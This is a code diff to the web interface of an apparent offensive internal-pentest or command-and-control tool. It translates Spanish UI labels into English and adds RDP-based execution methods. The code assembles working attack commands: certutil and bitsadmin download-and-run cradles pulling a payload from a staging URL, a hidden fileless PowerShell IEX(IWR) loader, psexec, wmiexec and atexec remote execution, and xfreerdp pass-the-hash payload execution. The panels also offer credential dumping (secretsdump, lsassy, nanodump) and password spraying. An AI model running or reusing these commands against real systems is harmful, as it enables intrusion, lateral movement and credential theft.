@@ -1710,7 +1710,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
         <div class="panel stager-card-full" id="int-pentest-panel" style="display:none">
           <div class="panel-header">
             <span class="panel-title">Internal Pentest Cradles</span>
-            <span style="font-size:10px;color:var(--text3);margin-left:8px">asume credenciales válidas en el target</span>
+            <span style="font-size:10px;color:var(--text3);margin-left:8px">assumes valid credentials on the target</span>
           </div>
           <div id="int-pentest-body" style="display:flex;min-height:380px">
             <!-- Config lateral -->
@@ -1718,7 +1718,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <div style="margin-bottom:8px">
                 <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">Loot creds</div>
                 <select id="ipc-cred-select" style="width:100%;font-size:11px" onchange="ipcLoadCred()">
-                  <option value="">— seleccionar credencial —</option>
+                  <option value="">— select credential —</option>
                 </select>
               </div>
               <hr style="border-color:var(--border);margin:0 0 8px">
@@ -1727,8 +1727,8 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <div class="ipc-field"><label>Username</label><input id="ipc-user" placeholder="Administrator" oninput="ipcUpdate()"></div>
               <div class="ipc-field"><label>Password</label><input id="ipc-pass" placeholder="P@ss1!" oninput="ipcUpdate()"></div>
               <div class="ipc-field"><label>NTLM Hash</label><input id="ipc-hash" placeholder=":aad3b435..." oninput="ipcUpdate()"></div>
-              <div class="ipc-field"><label>Payload</label><select id="ipc-lbin" style="font-size:11px" onchange="ipcUpdate()"><option value="">— seleccionar —</option></select></div>
-              <div class="ipc-field"><label>Ruta remota</label><input id="ipc-rpath" placeholder="C:\Windows\Temp\svc.exe" oninput="ipcUpdate()"></div>
+              <div class="ipc-field"><label>Payload</label><select id="ipc-lbin" style="font-size:11px" onchange="ipcUpdate()"><option value="">— select —</option></select></div>
+              <div class="ipc-field"><label>Remote path</label><input id="ipc-rpath" placeholder="C:\Windows\Temp\svc.exe" oninput="ipcUpdate()"></div>
               <div class="ipc-field"><label>Staging URL</label><input id="ipc-surl" placeholder="http://10.x.x.x:8080/a.exe" oninput="ipcUpdate()"></div>
               <div class="ipc-field"><label>IP Kali (SMB server)</label><input id="ipc-kaliip" placeholder="10.10.10.1" oninput="ipcUpdate()"></div>
             </div>
@@ -1746,28 +1746,28 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
               <!-- Panel: Cradles -->
               <div id="ipc-panel-cradles" class="ipc-panel" style="padding:10px;gap:7px">
-                <div class="ipc-section-title">Upload via SMB + Ejecución</div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient — Subir binario</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-upload"></pre><button class="ipc-copy" onclick="ipcCopy('smb-upload')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient + wmiexec — Upload &amp; exec</span><span class="ipc-tag ipc-tag-wmi">WMI</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-wmi"></pre><button class="ipc-copy" onclick="ipcCopy('smb-wmi')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient + atexec — Scheduled Task</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-atexec"></pre><button class="ipc-copy" onclick="ipcCopy('smb-atexec')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient + dcomexec — DCOM/MMC</span><span class="ipc-tag ipc-tag-wmi">DCOM</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-dcom"></pre><button class="ipc-copy" onclick="ipcCopy('smb-dcom')">Copiar</button></div></div>
-                <div class="ipc-section-title">Herramientas all-in-one</div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">psexec — Upload + shell SYSTEM</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-psexec"></pre><button class="ipc-copy" onclick="ipcCopy('psexec')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbexec — Shell SMB remota</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smbexec"></pre><button class="ipc-copy" onclick="ipcCopy('smbexec')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">netexec — Upload + exec</span><span class="ipc-tag ipc-tag-tool">NXE</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-nxe-upload"></pre><button class="ipc-copy" onclick="ipcCopy('nxe-upload')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">evil-winrm — Sesión + upload</span><span class="ipc-tag ipc-tag-tool">WinRM</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-evilwinrm"></pre><button class="ipc-copy" onclick="ipcCopy('evilwinrm')">Copiar</button></div></div>
-                <div class="ipc-section-title">LOLBin — Descarga desde staging + exec</div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">wmiexec + certutil</span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-certutil"></pre><button class="ipc-copy" onclick="ipcCopy('certutil')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">wmiexec + bitsadmin</span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-bitsadmin"></pre><button class="ipc-copy" onclick="ipcCopy('bitsadmin')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">wmiexec + PowerShell IEX <span style="font-size:9px;color:var(--text3)">(fileless)</span></span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-ps-iex"></pre><button class="ipc-copy" onclick="ipcCopy('ps-iex')">Copiar</button></div></div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">netexec + PowerShell IEX</span><span class="ipc-tag ipc-tag-tool">NXE</span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-nxe-iex"></pre><button class="ipc-copy" onclick="ipcCopy('nxe-iex')">Copiar</button></div></div>
-                <div class="ipc-section-title">Servidor SMB local (sin subir archivo)</div>
-                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">impacket-smbserver + wmiexec UNC</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smbserver"></pre><button class="ipc-copy" onclick="ipcCopy('smbserver')">Copiar</button></div></div>
+                <div class="ipc-section-title">Upload via SMB + Execution</div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient — Upload binary</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-upload"></pre><button class="ipc-copy" onclick="ipcCopy('smb-upload')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient + wmiexec — Upload &amp; exec</span><span class="ipc-tag ipc-tag-wmi">WMI</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-wmi"></pre><button class="ipc-copy" onclick="ipcCopy('smb-wmi')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient + atexec — Scheduled Task</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-atexec"></pre><button class="ipc-copy" onclick="ipcCopy('smb-atexec')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbclient + dcomexec — DCOM/MMC</span><span class="ipc-tag ipc-tag-wmi">DCOM</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smb-dcom"></pre><button class="ipc-copy" onclick="ipcCopy('smb-dcom')">Copy</button></div></div>
+                <div class="ipc-section-title">All-in-one tools</div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">psexec — Upload + shell SYSTEM</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-psexec"></pre><button class="ipc-copy" onclick="ipcCopy('psexec')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">smbexec — Remote SMB shell</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smbexec"></pre><button class="ipc-copy" onclick="ipcCopy('smbexec')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">netexec — Upload + exec</span><span class="ipc-tag ipc-tag-tool">NXE</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-nxe-upload"></pre><button class="ipc-copy" onclick="ipcCopy('nxe-upload')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">evil-winrm — Session + upload</span><span class="ipc-tag ipc-tag-tool">WinRM</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-evilwinrm"></pre><button class="ipc-copy" onclick="ipcCopy('evilwinrm')">Copy</button></div></div>
+                <div class="ipc-section-title">LOLBin — Download from staging + exec</div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">wmiexec + certutil</span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-certutil"></pre><button class="ipc-copy" onclick="ipcCopy('certutil')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">wmiexec + bitsadmin</span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-bitsadmin"></pre><button class="ipc-copy" onclick="ipcCopy('bitsadmin')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">wmiexec + PowerShell IEX <span style="font-size:9px;color:var(--text3)">(fileless)</span></span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-ps-iex"></pre><button class="ipc-copy" onclick="ipcCopy('ps-iex')">Copy</button></div></div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">netexec + PowerShell IEX</span><span class="ipc-tag ipc-tag-tool">NXE</span><span class="ipc-tag ipc-tag-lol">LOLBin</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-nxe-iex"></pre><button class="ipc-copy" onclick="ipcCopy('nxe-iex')">Copy</button></div></div>
+                <div class="ipc-section-title">Local SMB server (without uploading file)</div>
+                <div class="ipc-card"><div class="ipc-head"><span class="ipc-title">impacket-smbserver + wmiexec UNC</span><span class="ipc-tag ipc-tag-smb">SMB</span></div><div class="ipc-body"><pre class="ipc-cmd" id="ipc-smbserver"></pre><button class="ipc-copy" onclick="ipcCopy('smbserver')">Copy</button></div></div>
               </div>
 
               <!-- Panel: Validate -->
               <div id="ipc-panel-validate" class="ipc-panel ipc-active" style="padding:12px;gap:8px">
-                <p style="font-size:11px;color:var(--text3);margin:0">Verifica si las credenciales configuradas dan acceso al target</p>
+                <p style="font-size:11px;color:var(--text3);margin:0">Validates whether the configured credentials give access to the target</p>
                 <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
                   <button class="btn btn-ghost btn-sm" onclick="ipcValidate('smb')">SMB</button>
                   <button class="btn btn-ghost btn-sm" onclick="ipcValidate('winrm')">WinRM</button>
@@ -1795,7 +1795,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 <div style="overflow-y:auto;max-height:180px;border:1px solid var(--border);border-radius:4px">
                   <table style="width:100%">
                     <thead><tr><th>IP</th><th>Hostname</th><th>OS</th><th>Access</th><th>Admin</th></tr></thead>
-                    <tbody id="ipc-sweep-tbody"><tr><td colspan="5" style="text-align:center;color:var(--text3);padding:10px">Sin resultados</td></tr></tbody>
+                    <tbody id="ipc-sweep-tbody"><tr><td colspan="5" style="text-align:center;color:var(--text3);padding:10px">No results</td></tr></tbody>
                   </table>
                 </div>
                 <div id="ipc-sweep-out" class="ipc-out" style="max-height:130px"></div>
@@ -1806,7 +1806,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 <div style="display:flex;gap:8px">
                   <select id="ipc-dump-method" style="flex:1">
                     <option value="secretsdump">secretsdump — SAM / NTDS / LSA</option>
-                    <option value="lsassy">lsassy — LSASS en memoria</option>
+                    <option value="lsassy">lsassy — LSASS in memory</option>
                     <option value="nanodump">nanodump — via NXE module</option>
                     <option value="dpapi">DPAPI backupkeys</option>
                   </select>
@@ -1837,10 +1837,10 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
               <!-- Panel: Spray -->
               <div id="ipc-panel-spray" class="ipc-panel" style="padding:12px;gap:8px">
-                <p style="font-size:11px;color:var(--text3);margin:0">Pega usuarios (uno por línea) o introduce ruta a fichero</p>
+                <p style="font-size:11px;color:var(--text3);margin:0">Paste users (one per line) or enter file path</p>
                 <textarea id="ipc-spray-users" placeholder="administrator&#10;svc_sql&#10;john.doe&#10;&#10;— o —&#10;/tmp/users.txt" style="height:80px;resize:vertical;font-family:var(--font-mono);font-size:11px"></textarea>
                 <div style="display:flex;gap:8px">
-                  <input id="ipc-spray-pass" placeholder="Password a probar" style="flex:1">
+                  <input id="ipc-spray-pass" placeholder="Password to test" style="flex:1">
                   <select id="ipc-spray-proto" style="width:85px">
                     <option value="smb">SMB</option>
                     <option value="winrm">WinRM</option>
@@ -1858,9 +1858,9 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
           </div>
           <!-- Automation footer — siempre visible, fuera del scroll -->
           <div style="border-top:1px solid var(--border);padding:10px 12px;background:var(--bg3);display:flex;align-items:center;gap:10px;flex-wrap:wrap">
-            <span style="font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.6px;flex-shrink:0">Ejecución automática</span>
+            <span style="font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.6px;flex-shrink:0">Auto execution</span>
             <select id="ipc-method" style="flex:1;min-width:200px;max-width:320px">
-              <optgroup label="── SMB Upload (necesita Binario local)">
+              <optgroup label="── SMB Upload (requires Local Binary)">
                 <option value="smb-wmi">smbclient + wmiexec</option>
                 <option value="smb-atexec">smbclient + atexec</option>
                 <option value="smb-dcom">smbclient + dcomexec</option>
@@ -1868,17 +1868,21 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 <option value="psexec">psexec (auto-upload)</option>
                 <option value="smbexec">smbexec (shell)</option>
               </optgroup>
-              <optgroup label="── LOLBin (necesita Staging URL)">
+              <optgroup label="── LOLBin (requires Staging URL)">
                 <option value="lol-certutil">wmiexec + certutil</option>
                 <option value="lol-bitsadmin">wmiexec + bitsadmin</option>
                 <option value="lol-iex">wmiexec + PS IEX (fileless)</option>
                 <option value="nxe-iex">netexec + PS IEX</option>
               </optgroup>
+              <optgroup label="── RDP (requires Local Binary)">
+                <option value="rdp-drive">xfreerdp /drive mount + exec</option>
+                <option value="rdp-drive-pth">xfreerdp /pth restricted-admin + exec</option>
+              </optgroup>
             </select>
             <button class="btn btn-ghost btn-sm" id="ipc-btn-upload" onclick="ipcRun('upload')">⬆ Upload</button>
             <button class="btn btn-ghost btn-sm" id="ipc-btn-exec" onclick="ipcRun('exec')">▶ Exec</button>
             <button class="btn btn-primary btn-sm" id="ipc-btn-run" onclick="ipcRun('upload-exec')">⚡ Upload+Exec</button>
-            <button class="btn btn-danger btn-sm" id="ipc-btn-cancel" onclick="ipcCancel()" style="display:none">✕ Cancelar</button>
+            <button class="btn btn-danger btn-sm" id="ipc-btn-cancel" onclick="ipcCancel()" style="display:none">✕ Cancel</button>
             <div id="ipc-run-output" style="display:none;width:100%;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:7px;font-family:var(--font-mono);font-size:10px;color:var(--green);white-space:pre-wrap;max-height:200px;overflow-y:auto;line-height:1.45"></div>
           </div>
         </div>
@@ -1889,7 +1893,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
     <!-- ── Internal Pentest (top-level tab) ── -->
     <div class="tab-panel" id="tab-pentest">
       <div class="toolbar">
-        <span style="color:var(--text3);font-size:11px">Validación, movimiento lateral y ejecución de agentes en redes internas</span>
+        <span style="color:var(--text3);font-size:11px">Credential validation, lateral movement and agent execution on internal networks</span>
         <div class="spacer"></div>
         <button class="btn btn-ghost btn-sm" onclick="ipcLoadArtifacts()">↻ Refresh payloads</button>
       </div>
@@ -15529,11 +15533,12 @@ async function ipcRun(action) {
   // Build shell command(s) based on method + action
   const cmds = [];
   const isLOL = method.startsWith('lol-') || method === 'nxe-iex';
+  const isRDP = method.startsWith('rdp-');
 
-  if (!isLOL) {
+  if (!isLOL && !isRDP) {
     // SMB Upload methods
     if (action === 'upload' || action === 'upload-exec') {
-      if (!lbin) { toast('Selecciona un payload', 'error'); return; }
+      if (!lbin) { toast('Select a payload', 'error'); return; }
       cmds.push(`netexec smb ${a.target} ${a.nxe} --put-file ${lbin} '${rUnc}'`);
     }
     if (action === 'exec' || action === 'upload-exec') {
@@ -15548,9 +15553,9 @@ async function ipcRun(action) {
       const cmd = execMap[method];
       if (cmd) cmds.push(cmd);
     }
-  } else {
+  } else if (isLOL) {
     // LOLBin methods — use staging URL
-    if (!surl) { toast('Pon la Staging URL', 'error'); return; }
+    if (!surl) { toast('Enter Staging URL', 'error'); return; }
     if (method === 'lol-certutil')
       cmds.push(`impacket-wmiexec ${a.impkt} 'cmd.exe /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}'`);
     else if (method === 'lol-bitsadmin')
@@ -15561,7 +15566,25 @@ async function ipcRun(action) {
       cmds.push(`netexec smb ${a.target} ${a.nxe} -x 'powershell -nop -w hidden -c "IEX(IWR ''${surl}'' -UseBasicParsing)"'`);
   }
 
-  if (!cmds.length) { toast('Método no soportado', 'error'); return; }
+  // RDP methods — mount local dir as /drive and exec from \\tsclient\
+  if (isRDP) {
+    if (!lbin) { toast('Select a payload', 'error'); return; }
+    const lbinBase = lbinFile.includes('/') ? lbinFile.split('/').pop() : lbinFile;
+    const lbinDir  = `$(dirname "$(realpath "payloads/${lbinFile}")")`;
+    const ntHash   = a.hash.replace(/^:/, '') || a.hash;
+    const rdpCreds = (method === 'rdp-drive-pth' && ntHash)
+      ? `/pth:${ntHash} /restricted-admin`
+      : `/p:'${a.pass}'`;
+    // Double-escaped backslashes: shell double-quote reduces \\\\→\\ and \\→\, giving \\tsclient\upload\file.exe
+    cmds.push(
+      `xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore` +
+      ` /drive:upload,${lbinDir}` +
+      ` /app:cmd.exe "/app-cmd:/c \\\\\\\\tsclient\\\\upload\\\\${lbinBase}"` +
+      ` /f /log-level:OFF`
+    );
+  }
+
+  if (!cmds.length) { toast('Method not supported', 'error'); return; }
 
   const outEl = document.getElementById('ipc-run-output');
   outEl.style.display = 'block';
